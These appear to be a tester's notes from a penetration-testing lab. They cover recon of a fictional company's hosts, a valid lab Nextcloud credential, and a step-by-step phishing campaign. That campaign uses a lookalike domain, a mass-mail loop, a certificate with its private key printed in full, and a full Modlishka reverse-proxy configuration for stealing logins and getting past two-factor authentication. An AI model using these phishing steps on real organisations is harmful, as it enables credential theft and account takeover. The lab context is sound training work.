| ssl-cert: Subject: commonName=0x0security.com/organizationName=GiganticHosting CA/stateOrProvinceName=Stockholm/countryName=SE
| Subject Alternative Name: DNS:0x0security.com, DNS:*.0x0security.com
| Issuer: commonName=GiganticHosting.com/organizationName=Org/stateOrProvinceName=Stockholm/countryName=SE
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha512WithRSAEncryption
| Not valid before: 2020-03-07T19:45:00
| Not valid after:  2030-01-07T00:00:00
| MD5:   152a d58f 8a1e 73f9 eb94 5a73 6e69 d614
|_SHA-1: ebf5 cfca 7795 4ca1 e684 fa24 c1ce f407 3658 8372
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1

root@nix36:~/aptlabs# ffuf -w /usr/share/wordlists/dirb/big.txt:FUZZ -u https://10.10.110.231/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.110.231/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10]
css                     [Status: 301, Size: 314, Words: 20, Lines: 10]
fonts                   [Status: 301, Size: 316, Words: 20, Lines: 10]
images                  [Status: 301, Size: 317, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10]

```


Add hosts file "10.10.110.231  nextcloud.0x0security.com storage.0x0security.com 0x0security.com" and we see we have a nextcloud installationi
Trying to log in we are prompted by a message that 2fa is enforced but not configured for our account (admin:admin), 

`nextcloud version: nextcloud 18.0.1.3`



Nextcloud vaild accounts

`mark@0x0security.com | +90 433 794 13 53 | $Ul3S@t0x0S3c | mak`, but we get a 2fa enforced but not configured, creds are valid


Another ffuf on FQDN

```
root@nix36:~/aptlabs# ffuf -w /usr/share/wordlists/dirb/big.txt:FUZZ -u https://storage.0x0security.com/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : https://storage.0x0security.com/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.htaccess               [Status: 403, Size: 408, Words: 35, Lines: 12]
.htpasswd               [Status: 403, Size: 408, Words: 35, Lines: 12]
3rdparty                [Status: 301, Size: 339, Words: 20, Lines: 10]
apps                    [Status: 301, Size: 335, Words: 20, Lines: 10]
config                  [Status: 403, Size: 408, Words: 35, Lines: 12]
core                    [Status: 301, Size: 335, Words: 20, Lines: 10]
data                    [Status: 403, Size: 408, Words: 35, Lines: 12]
lib                     [Status: 301, Size: 334, Words: 20, Lines: 10]
resources               [Status: 301, Size: 340, Words: 20, Lines: 10]
robots.txt              [Status: 200, Size: 26, Words: 3, Lines: 3]
server-status           [Status: 403, Size: 408, Words: 35, Lines: 12]
themes                  [Status: 301, Size: 337, Words: 20, Lines: 10]
updater                 [Status: 301, Size: 338, Words: 20, Lines: 10]
:: Progress: [20469/20469] :: Job [1/1] :: 682 req/sec :: Duration: [0:00:30] :: Errors: 0 ::

```

Another ffuf

```
root@nix36:~/aptlabs# ffuf -w /usr/share/wordlists/dirb/big.txt:FUZZ -u https://0x0security.com/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : https://0x0security.com/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.htaccess               [Status: 403, Size: 281, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 281, Words: 20, Lines: 10]
css                     [Status: 301, Size: 318, Words: 20, Lines: 10]
fonts                   [Status: 301, Size: 320, Words: 20, Lines: 10]
images                  [Status: 301, Size: 321, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 281, Words: 20, Lines: 10]
:: Progress: [20469/20469] :: Job [1/1] :: 731 req/sec :: Duration: [0:00:28] :: Errors: 0 ::


```

Possible usernames

- Ralph@0x0security.com (business dealer)
- Emma@0x0security.com (bussiness manager)
- Robert@0x0security.com (product expert)
- mark@0x0security.com (Sales)












### 10.10.110.242

```sh
80/tcp open  http    Apache httpd 2.4.41 ((Unix))
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.41 (Unix)
|_http-title: Gigantic Hosting | Home
```

ffuf

```
root@nix36:~/aptlabs# ffuf -w /usr/share/wordlists/dirb/big.txt:FUZZ -u http://10.10.110.242/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.110.242/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.htaccess               [Status: 403, Size: 199, Words: 14, Lines: 8]
.htpasswd               [Status: 403, Size: 199, Words: 14, Lines: 8]
css                     [Status: 301, Size: 233, Words: 14, Lines: 8]
fonts                   [Status: 301, Size: 235, Words: 14, Lines: 8]
images                  [Status: 301, Size: 236, Words: 14, Lines: 8]
js                      [Status: 301, Size: 232, Words: 14, Lines: 8]

```

Gigantic hosting website










---










## Phishing - Beachhead



email list

```sh
robert@0x0security.com
mark@0x0security.com
emma@0x0security.com
ralph@0x0security.com
```

Add dns record

```sh
Domain: 0x0security.com , A record, IP: 10.10.14.15, Contenct phishme.0x0security.com
```


Send emails

```sh
root@nix36:~/aptlabs# while read mail;do swaks -to "$mail" -from "robert@0x0security.com" -body "goto https://phish.00security.com" -header "Subject: Credentials, Errors" -server 10.10.110.74;done < mails.txt

```


tcpdump results, we see traffic


```
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
00:51:02.215400 IP 10.10.110.50.63127 > 10.10.14.15.443: Flags [S], seq 1001259681, win 64240, options [mss 1357,sackOK,TS val 731942093 ecr 0,nop,wscale 7], length 0
E..<V.@.>.U.

n2

......;..................M...
+...........
00:51:02.215442 IP 10.10.14.15.443 > 10.10.110.50.63127: Flags [R.], seq 0, ack 1001259682, win 0, length 0
E..(..@.@..{

..

n2........;...P.......
00:51:02.807666 IP 10.10.110.50.51552 > 10.10.14.15.443: Flags [S], seq 1864189452, win 64240, options [mss 1357,sackOK,TS val 731942686 ecr 0,nop,wscale 7], length 0
E..<..@.>...

n2

...`..o.F................M...
+...........
00:51:02.807703 IP 10.10.14.15.443 > 10.10.110.50.51552: Flags [R.], seq 0, ack 1864189453, win 0, length 0
E..(..@.@..{

..

n2...`....o.F.P....5..
00:51:03.302404 IP 10.10.110.50.4417 > 10.10.14.15.443: Flags [S], seq 1292861919, win 64240, options [mss 1357,sackOK,TS val 731943180 ecr 0,nop,wscale 7], length 0
E..<.F@.>..

n2

...A..M..................M...
+...........
00:51:03.302460 IP 10.10.14.15.443 > 10.10.110.50.4417: Flags [R.], seq 0, ack 1292861920, win 0, length 0
E..(..@.@..{

..

n2...A....M...P...=...

```



tcpdump once more


```sh
root@nix36:~/aptlabs# tcpdump -n -i tun0 port 443
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
00:54:01.833028 IP 10.10.110.50.52782 > 10.10.14.15.443: Flags [S], seq 3258652956, win 64240, options [mss 1357,sackOK,TS val 732121712 ecr 0,nop,wscale 7], length 0
00:54:01.833099 IP 10.10.14.15.443 > 10.10.110.50.52782: Flags [R.], seq 0, ack 3258652957, win 0, length 0
00:54:01.867316 IP 10.10.110.50.20315 > 10.10.14.15.443: Flags [S], seq 1421535874, win 64240, options [mss 1357,sackOK,TS val 732121747 ecr 0,nop,wscale 7], length 0
00:54:01.867352 IP 10.10.14.15.443 > 10.10.110.50.20315: Flags [R.], seq 0, ack 1421535875, win 0, length 0
00:54:02.392189 IP 10.10.110.50.60859 > 10.10.14.15.443: Flags [S], seq 362124877, win 64240, options [mss 1357,sackOK,TS val 732122271 ecr 0,nop,wscale 7], length 0
00:54:02.392249 IP 10.10.14.15.443 > 10.10.110.50.60859: Flags [R.], seq 0, ack 362124878, win 0, length 0
00:54:02.399871 IP 10.10.110.50.57980 > 10.10.14.15.443: Flags [S], seq 545262974, win 64240, options [mss 1357,sackOK,TS val 732122279 ecr 0,nop,wscale 7], length 0
00:54:02.399897 IP 10.10.14.15.443 > 10.10.110.50.57980: Flags [R.], seq 0, ack 545262975, win 0, length 0
00:54:02.866293 IP 10.10.110.50.27963 > 10.10.14.15.443: Flags [S], seq 1498649485, win 64240, options [mss 1357,sackOK,TS val 732122746 ecr 0,nop,wscale 7], length 0
00:54:02.866333 IP 10.10.14.15.443 > 10.10.110.50.27963: Flags [R.], seq 0, ack 1498649486, win 0, length 0
00:54:02.912244 IP 10.10.110.50.1442 > 10.10.14.15.443: Flags [S], seq 3328300543, win 64240, options [mss 1357,sackOK,TS val 732122791 ecr 0,nop,wscale 7], length 0
00:54:02.912274 IP 10.10.14.15.443 > 10.10.110.50.1442: Flags [R.], seq 0, ack 3328300544, win 0, length 0
00:54:03.337259 IP 10.10.110.50.31422 > 10.10.14.15.443: Flags [S], seq 3188095971, win 64240, options [mss 1357,sackOK,TS val 732123216 ecr 0,nop,wscale 7], length 0
00:54:03.337312 IP 10.10.14.15.443 > 10.10.110.50.31422: Flags [R.], seq 0, ack 3188095972, win 0, length 0
00:54:03.423358 IP 10.10.110.50.5333 > 10.10.14.15.443: Flags [S], seq 47224423, win 64240, options [mss 1357,sackOK,TS val 732123302 ecr 0,nop,wscale 7], length 0
00:54:03.423389 IP 10.10.14.15.443 > 10.10.110.50.5333: Flags [R.], seq 0, ack 47224424, win 0, length 0

```




Trying to phish with evilnginx, no luck so far. Also trying with gophish, again no luck. Go to django certificate manager (10.10.110.62) and generate new cert


Trying with modlishka, after getting the key and pem files on the config `https://github.com/drk1wi/Modlishka/wiki/How-to-use`

ref: `https://www.ired.team/offensive-security/red-team-infrastructure/how-to-setup-modliska-reverse-http-proxy-for-phishing`





Working solution below:

Add `A` record 00security.com with content `10.10.14.15`
Go to django certificate website, generate certificate for 00security.com (include * as well). Then make 00security.com point to attacker IP

```sh
root@nix36:~/aptlabs# openssl genrsa -out 00security.com.key 4096
Generating RSA private key, 4096 bit long modulus (2 primes)
......................................................................................................................++++
..................................................................++++
e is 65537 (0x010001)
root@nix36:~/aptlabs# openssl req -new -key 00security.com.key -out 00security.com.csr -utf8 -batch -subj '/CN=00security.com/emailAddress=info@00security.com'
root@nix36:~/aptlabs# cat 00security.com.csr
-----BEGIN CERTIFICATE REQUEST-----
MIIEgjCCAmoCAQAwPTEXMBUGA1UEAwwOMDBzZWN1cml0eS5jb20xIjAgBgkqhkiG
9w0BCQEWE2luZm9AMDBzZWN1cml0eS5jb20wggIiMA0GCSqGSIb3DQEBAQUAA4IC
DwAwggIKAoICAQC62wqZtpYs+87Elp9qepcDfOXx5J8+SnQxG/YFBq1Q8B2XVeKA
LcAgW5dWWBvLIk11w0rOylLp3vzuGPNSV1h0OHCrwKoBIBhXIzevHChNp3ib5j2I
sifttzP8QOplA4pxXZLYoUPITyYRkV5jrdc2pookM14s964nTRevUiaOkIli9Y5r
KV4uWl3yp/tXGbRMa2Uhxg1PbkHw9g2urO/xNMhHJZqo1YZ/mMPeXOGjDi8PpdxX
hr7zO6Y2MoMzBlJ4992DveqJ5ldak2eSK2jEYhp9RfpKoUYt7LL1Ipcc8ThD6Y6x
n4gTe8hh61ABkIbep1HE8O/RXUDnJVdPUqLV+YKbV4DaofPtkm2HmHEPGVurxXbH
h3u1KTLIZunRH/GASWqOun0HckAXqyTgTg/w2rCb5/IGisb+VbQQWGWdlXfO1h1W
8yzVue+Da1VLjoRPSvNXEJ/5N9dXsJi3kx1KgFGgEbi+w7vyGnWyJDRSW7H3JKg0
Q2AC1Spu144Uv2WKnFvNhFbd9q2r3rj3cMJXI66AOQuHhSK28wGwHsjlU3VS1tls
PUulecgOBLvddmsa2IKQHBg5czoI0tFYUzVN39+WruJCbmVbjRlrFdVVVFR+bYZo
4QAGclUyyAP1opW/LdvVMypK7d7tMX2D8/I8g1ymPnVvmnMXM6UiEA7AJwIDAQAB
oAAwDQYJKoZIhvcNAQELBQADggIBAK3D5sCaP1nsAl9AtrDtAQiC6dYFJZxXJ9rZ
2Fnlr8QbM450Zacg9WNc0mq893USIU2k4kWCNulVFQUat/cbWzTWzKt6xb4vLQbc
19w3HL/tp/yNHjkkU+8uwaA7zedrHS1V+NgXG6xXTcj2u0/3LKMn4U6KwskSG94v
Of769TzjzDvj2rn9cJXpDC7pSsnFURuUvj9X/Uqe2eeQQ3dW+qpvAHRQAoD78vUj
BchhLaFCx5EBCsr0N0Nl2HfH6Pt8RPg32Fh560ZPotzoMYI5zPNacwO25NO5qHt2
n2UHlLn6PtpbWS+rB6lF7KG75D1EU6XJZCvlfapZFiR24B3+KfZiGVxGPg4tq8Fc
2qmFMJTy/rnuLD91ZV2ueMQ5HN7UM2fb6FqEc75+VwR6MWdqdmP+8X/ZUawMpMBs
YWuYRmLN3vLUKoPl+jzKU0bTsT9L9khCEFYiD+7TlXvVk1TKfoSHvY/zpoeXzeGm
UC0cIsjFR+RJZYqdmfkaCXoSdD8DSfIS625h/rmSzl7ElEFIV1bE2B7HVYr+pL5W
wptAxIuzfFXUgP9tfUQSUktmrQXfvhdLiHUXBZ1SEamT+IKV2+zTV8x4NN1uBrRU
IYwrhTBimLT+wfdwWGZxJlV4TYvuK2E77QMrpjw+IXXwfkbXJMhqQ3//0uRe4TiG
R2Ausx7u
-----END CERTIFICATE REQUEST-----

```

Cert is the following

```sh
ommonName:
00security.com
SubjectAlternativeName:

    DNS:00security.com
    DNS:*.00security.com

Distinguished Name:
/C=SE/ST=Stockholm/L=Stockholm/O=GiganticHosting CA/OU=GiganticHosting CA Testsuite/CN=00security.com/emailAddress=info@00security.com
Serial:
0A:18:66:8E:43:00:B3:D8:60:2D:CC:E9:57:C2:06:9D:D6:C4:58:26
Certificate Authority:
0x0security
Expires:
Dec. 12, 2022, midnight
Watchers:
HPKP pin:
qHY1bc+Pw84zMo2RG1+3YwjM8i08OEcurR2K9gISUVw=


AuthorityInformationAccess:
CA Issuers:

    URI:http://192.168.20.31/django_ca/issuer/5157C3DD0A3A86A18CCB426AC20674B86F2E84D5.der

OCSP:

    URI:http://192.168.20.31/django_ca/ocsp/5157C3DD0A3A86A18CCB426AC20674B86F2E84D5/cert/

AuthorityKeyIdentifier:

    Key ID: AB:3E:5F:38:2D:24:B1:9E:0F:5E:7D:1E:D1:B2:E3:80:04:BF:06:22

BasicConstraints:
Critical Critical
CA:FALSE
CRLDistributionPoints:
Distribution Point:

    Full Name: URI:http://192.168.20.31/django_ca/crl/5157C3DD0A3A86A18CCB426AC20674B86F2E84D5/

ExtendedKeyUsage:

    serverAuth

KeyUsage:
Critical Critical

    digitalSignature
    keyAgreement
    keyEncipherment

SubjectKeyIdentifier:
DE:25:3D:EA:00:F8:19:6C:C7:6A:58:E8:33:AB:18:F9:B5:BF:E4:05

```



Download modlishka and create a config file, import a key, pem file using `awk '{printf "%s\\n", $0}' ../00security.com.key`

Final config file looks like this

```json
rroot@nix36:~/aptlabs# cat modlishka/modlishka.json
{
  "proxyDomain": "00security.com",
  "listeningAddress": "10.10.14.15",

  "target": "nextcloud.0x0security.com",
  "targetResources": "",
  "targetRules": "",
  "terminateTriggers": "",
  "terminateRedirectUrl": "",
  "trackingCookie": "id",
  "trackingParam": "id",
  "jsRules":"",
  "forceHTTPS": false,
  "forceHTTP": false,
  "dynamicMode": false,
  "debug": true,
  "logPostOnly": false,
  "disableSecurity": true,
  "log": "requests.log",
  "plugins": "all",
  "cert": "-----BEGIN CERTIFICATE-----\nMIIHejCCBWKgAwIBAgIUChhmjkMAs9hgLczpV8IGndbEWCYwDQYJKoZIhvcNAQEN\nBQAwXTELMAkGA1UEBhMCU0UxEjAQBgNVBAgMCVN0b2NraG9sbTESMBAGA1UEBwwJ\nU3RvY2tob2xtMQwwCgYDVQQKDANPcmcxGDAWBgNVBAMMDzB4MHNlY3VyaXR5LmNv\nbTAeFw0yMDEyMTIxODEwMDBaFw0yMjEyMTIwMDAwMDBaMIG2MQswCQYDVQQGEwJT\nRTESMBAGA1UECAwJU3RvY2tob2xtMRIwEAYDVQQHDAlTdG9ja2hvbG0xGzAZBgNV\nBAoMEkdpZ2FudGljSG9zdGluZyBDQTElMCMGA1UECwwcR2lnYW50aWNIb3N0aW5n\nIENBIFRlc3RzdWl0ZTEXMBUGA1UEAwwOMDBzZWN1cml0eS5jb20xIjAgBgkqhkiG\n9w0BCQEWE2luZm9AMDBzZWN1cml0eS5jb20wggIiMA0GCSqGSIb3DQEBAQUAA4IC\nDwAwggIKAoICAQC62wqZtpYs+87Elp9qepcDfOXx5J8+SnQxG/YFBq1Q8B2XVeKA\nLcAgW5dWWBvLIk11w0rOylLp3vzuGPNSV1h0OHCrwKoBIBhXIzevHChNp3ib5j2I\nsifttzP8QOplA4pxXZLYoUPITyYRkV5jrdc2pookM14s964nTRevUiaOkIli9Y5r\nKV4uWl3yp/tXGbRMa2Uhxg1PbkHw9g2urO/xNMhHJZqo1YZ/mMPeXOGjDi8PpdxX\nhr7zO6Y2MoMzBlJ4992DveqJ5ldak2eSK2jEYhp9RfpKoUYt7LL1Ipcc8ThD6Y6x\nn4gTe8hh61ABkIbep1HE8O/RXUDnJVdPUqLV+YKbV4DaofPtkm2HmHEPGVurxXbH\nh3u1KTLIZunRH/GASWqOun0HckAXqyTgTg/w2rCb5/IGisb+VbQQWGWdlXfO1h1W\n8yzVue+Da1VLjoRPSvNXEJ/5N9dXsJi3kx1KgFGgEbi+w7vyGnWyJDRSW7H3JKg0\nQ2AC1Spu144Uv2WKnFvNhFbd9q2r3rj3cMJXI66AOQuHhSK28wGwHsjlU3VS1tls\nPUulecgOBLvddmsa2IKQHBg5czoI0tFYUzVN39+WruJCbmVbjRlrFdVVVFR+bYZo\n4QAGclUyyAP1opW/LdvVMypK7d7tMX2D8/I8g1ymPnVvmnMXM6UiEA7AJwIDAQAB\no4IB1jCCAdIwDAYDVR0TAQH/BAIwADAdBgNVHQ4EFgQU3iU96gD4GWzHaljoM6sY\n+bW/5AUwHwYDVR0jBBgwFoAUqz5fOC0ksZ4PXn0e0bLjgAS/BiIwXQYDVR0fBFYw\nVDBSoFCgToZMaHR0cDovLzE5Mi4xNjguMjAuMzEvZGphbmdvX2NhL2NybC81MTU3\nQzNERDBBM0E4NkExOENDQjQyNkFDMjA2NzRCODZGMkU4NEQ1LzCB0AYIKwYBBQUH\nAQEEgcMwgcAwXgYIKwYBBQUHMAGGUmh0dHA6Ly8xOTIuMTY4LjIwLjMxL2RqYW5n\nb19jYS9vY3NwLzUxNTdDM0REMEEzQTg2QTE4Q0NCNDI2QUMyMDY3NEI4NkYyRTg0\nRDUvY2VydC8wXgYIKwYBBQUHMAKGUmh0dHA6Ly8xOTIuMTY4LjIwLjMxL2RqYW5n\nb19jYS9pc3N1ZXIvNTE1N0MzREQwQTNBODZBMThDQ0I0MjZBQzIwNjc0Qjg2RjJF\nODRENS5kZXIwKwYDVR0RBCQwIoIOMDBzZWN1cml0eS5jb22CECouMDBzZWN1cml0\neS5jb20wDgYDVR0PAQH/BAQDAgOoMBMGA1UdJQQMMAoGCCsGAQUFBwMBMA0GCSqG\nSIb3DQEBDQUAA4ICAQAN2S8D6oXa4Vg1x2tcIVw57/YwOIVJoN7aerZl/iC2mA8+\neydrIkvG9VOBfcCoCEUAwDIhly2HnqdIlFwm1Qc7Sobb880Tz5fglsfPdyjk3fYI\nKYzCr5aBM6NPjTksIThhfMP/QNcb+F9l44z6rnYoM3MsVbthEVSjWS0kakcP5BGC\nyozA8i2aTZUxEpvtAlf1o3x+y+obIDnWASa1+4GNmXdubraFkK1LCk8P7i0QQasP\nNeDQFlNM+0xXJPn71LnW3XJ1orNQSoUjmib/o30fAKp5erlne4siKb6iME1epk8F\n1xC7YHtKE8Dp8ZbLIfK0nYChRhDO0CBPdCixAZSe2irOfIZjixYaPunP2YkOO192\n8+iG/B0ccsTLRz8SmuXmuXX8gYUSSlx6u6tDnisVAa4b/i0LtC+aVh/y49F9vcSP\nyAuiGKU4TITApyFvQ49zY+WihZF/JkujpOfgqQC2IuJW5nygJisBLtS6RdYZyfvP\nNk7D//ugmfdHFQh+SgdDsFT6FK7Qhn00krwIPw+qj93Ub+nzgweOO5dAJW4+Fzl9\nBSREoUbY+za8PpLJOp1Tb7/na4EtOcoKkISmkkH5kdOUzYVgzjj8m1Ppn9iGnuQ8\nqtozq/z2+eigKPmWylA686KcoqWTqRDQ7ZypW4Ux0VLj1u2aBg9T6a82ryjh3Q==\n-----END CERTIFICATE-----\n",
  "certKey": "-----BEGIN RSA PRIVATE KEY-----\n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\n-----END RSA PRIVATE KEY-----\n",
  "certPool": ""
}


```


Make sure you can resolv (hosts file) `nextcloud.00security.com`


Modlishka run looks like this

```sh
root@nix36:~/aptlabs/modlishka# ./Modlishka-linux-amd64 -config modlishka.json
[Sat Dec 12 18:16:31 2020]  INF  Enabling plugin: autocert v0.1
[Sat Dec 12 18:16:31 2020]  INF  Enabling plugin: control_panel v0.1
[Sat Dec 12 18:16:31 2020]  INF  Enabling plugin: hijack v0.1
[Sat Dec 12 18:16:31 2020]  INF  Enabling plugin: template v0.1
[Sat Dec 12 18:16:31 2020]  INF  Control Panel: SayHello2Modlishka handler registered
[Sat Dec 12 18:16:31 2020]  INF  Control Panel URL: /SayHello2Modlishka
[Sat Dec 12 18:16:31 2020]  INF

 _______           __ __ __         __     __
|   |   |.-----.--|  |  |__|.-----.|  |--.|  |--.---.-.
|       ||  _  |  _  |  |  ||__ --||     ||    <|  _  |
|__|_|__||_____|_____|__|__||_____||__|__||__|__|___._|

>>>> "Modlishka" Reverse Proxy started - v.1.1 <<<<
Author: Piotr Duszynski @drk1wi

Listening on [10.10.14.15:443]
Proxying HTTPS [nextcloud.0x0security.com] via [https://00security.com]
Listening on [10.10.14.15:80]
Proxying HTTP [nextcloud.0x0security.com] via [http://00security.com]
[Sat Dec 12 18:18:01 2020]  DBG  Subdomain: nextcloud
